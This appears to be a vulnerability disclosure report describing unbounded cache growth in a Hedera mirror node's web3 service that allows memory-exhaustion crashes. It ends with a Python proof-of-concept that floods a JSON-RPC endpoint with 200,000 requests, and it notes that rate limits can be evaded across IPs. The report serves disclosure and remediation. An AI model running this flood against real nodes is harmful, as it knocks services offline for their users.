### Title
Unbounded `CaffeineCacheManager` Internal Cache Map Growth via Distinct `contractId` Requests Leads to Memory Exhaustion (OOM)

### Summary
`cacheManagerSlotsPerContract` is configured as a `CaffeineCacheManager` in dynamic mode (no `setCacheNames()` call), causing its internal `ConcurrentHashMap<String, Cache> cacheMap` to grow without bound as `findStorageBatch()` calls `getCache(contractId.toString())` for each new contract ID. The level-1 `contractSlotsCache` (max 3000 entries) evicts entries but never removes the corresponding named caches from `cacheManagerSlotsPerContract`'s `cacheMap`, creating a permanent memory leak. An unprivileged attacker can trigger this via public JSON-RPC endpoints (`eth_call`, `eth_estimateGas`) using thousands of distinct contract addresses.

### Finding Description

**Root cause — `EvmConfiguration.java` lines 107–112:**

```java
@Bean(CACHE_MANAGER_SLOTS_PER_CONTRACT)
CaffeineCacheManager cacheManagerSlotsPerContract() {
    final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
    caffeineCacheManager.setCacheSpecification(cacheProperties.getSlotsPerContract());
    return caffeineCacheManager;  // NO setCacheNames() → dynamic mode
}
```

Unlike every other `CaffeineCacheManager` bean in `EvmConfiguration.java` (which all call `setCacheNames(Set.of(...))`), `cacheManagerSlotsPerContract` omits `setCacheNames()`. In Spring's `CaffeineCacheManager`, omitting `setCacheNames()` enables dynamic cache creation: every call to `getCache(name)` with a previously unseen name creates a new `CaffeineCache` and stores it permanently in the manager's internal `ConcurrentHashMap<String, Cache> cacheMap`. This map has no size limit and no eviction mechanism.

**Trigger — `ContractStateServiceImpl.java` line 87:**

```java
final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
        contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
```

For each new `contractId` not present in the level-1 `contractSlotsCache`, the lambda fires and calls `cacheManagerSlotsPerContract.getCache(contractId.toString())`. This inserts a new `CaffeineCache` (wrapping a Caffeine cache with `maximumSize=1500`) into `cacheManagerSlotsPerContract`'s `cacheMap` under the key `contractId.toString()`.

**Why the level-1 guard is insufficient:**

The level-1 `contractSlotsCache` (`CACHE_MANAGER_CONTRACT_SLOTS`) is configured with `maximumSize=3000` (`CacheProperties.java` line 25: `expireAfterAccess=5m,maximumSize=3000`). When it evicts a `contractId`, the `CaffeineCache` object is removed from the level-1 cache's value store. However, `cacheManagerSlotsPerContract`'s `cacheMap` retains its own reference to that same `CaffeineCache` under the key `contractId.toString()` — it is never notified of the eviction and never removes the entry. The two data structures are completely decoupled with respect to eviction.

**Exploit flow:**

1. Attacker sends N `eth_call` (or `eth_estimateGas`) requests, each targeting a distinct contract address (e.g., `0x0000000000000000000000000000000000000001` through `0x000000000000000000000000000000000000FFFF`).
2. Each request reaches `ContractStorageReadableKVState.readFromDataSource()` → `contractStateService.findStorage(entityId, keyBytes)` → `findStorageBatch()`.
3. Each distinct `contractId` triggers `cacheManagerSlotsPerContract.getCache(contractId.toString())`, inserting a new `CaffeineCache` into `cacheMap`.
4. After 3000 requests, the level-1 cache starts evicting, but `cacheManagerSlotsPerContract.cacheMap` continues to grow.
5. With N = 100,000 distinct contract IDs, `cacheMap` holds 100,000 `CaffeineCache` instances. Each Caffeine `BoundedLocalCache` with `maximumSize=1500` allocates internal arrays/structures of ~16–64 KB even when empty. Total heap consumption: ~1.6–6.4 GB, causing OOM on the JVM.

### Impact Explanation

Memory exhaustion on mirror node JVM processes. The JVM will throw `OutOfMemoryError`, crashing the web3 service. Since mirror nodes are stateless replicas, an attacker targeting multiple nodes simultaneously (or a single node repeatedly) can take down 30%+ of the network's JSON-RPC processing capacity without any brute-force or cryptographic attack. The attack is purely additive — each new distinct contract address permanently consumes memory with no recovery path short of a process restart.

### Likelihood Explanation

The attack requires no authentication, no privileged access, and no on-chain transactions. The Hedera entity ID space is 64-bit, providing billions of distinct contract IDs. An attacker needs only an HTTP client and a list of distinct Ethereum-format addresses. The attack is repeatable after a node restart. Rate limiting (if present) can be bypassed by distributing requests across time or source IPs. The `enableBatchContractSlotCaching` flag defaults to `true` (`CacheProperties.java` line 30), so the vulnerable code path is active by default.

### Recommendation

1. **Fix the root cause:** Call `setCacheNames()` on `cacheManagerSlotsPerContract` with a fixed set of names, or switch to a design that does not use `CaffeineCacheManager.getCache()` with attacker-controlled names.
2. **Preferred alternative:** Replace the two-level cache structure with a single Caffeine cache keyed by `(contractId, slotKey)` pair, eliminating the need for dynamic named cache creation entirely.
3. **If dynamic creation is retained:** Wrap `cacheManagerSlotsPerContract` with a size-bounded registry (e.g., a `LinkedHashMap` with a max size and LRU eviction) that removes named caches from the `CaffeineCacheManager` when they are evicted from the level-1 `contractSlotsCache`, using a Caffeine removal listener on `contractSlotsCache`.
4. **Short-term mitigation:** Add rate limiting per IP on the JSON-RPC endpoint and cap the number of distinct contract IDs processed per time window.

### Proof of Concept

```python
import requests, threading

TARGET = "http://<mirror-node>:8545"

def send_eth_call(contract_num):
    # Construct a distinct contract address for each contract_num
    addr = "0x" + hex(contract_num)[2:].zfill(40)
    payload = {
        "jsonrpc": "2.0", "method": "eth_call",
        "params": [{"to": addr, "data": "0x6d4ce63c"}, "latest"],
        "id": contract_num
    }
    requests.post(TARGET, json=payload, timeout=5)

# Send 200,000 requests with distinct contract addresses
threads = []
for i in range(1, 200001):
    t = threading.Thread(target=send_eth_call, args=(i,))
    threads.append(t)
    t.start()
    if len(threads) % 500 == 0:
        for t in threads: t.join()
        threads = []

# Result: cacheManagerSlotsPerContract.cacheMap grows to 200,000 entries,
# each holding a CaffeineCache with maximumSize=1500 internal structures,
# exhausting JVM heap and triggering OOM / process crash.
```
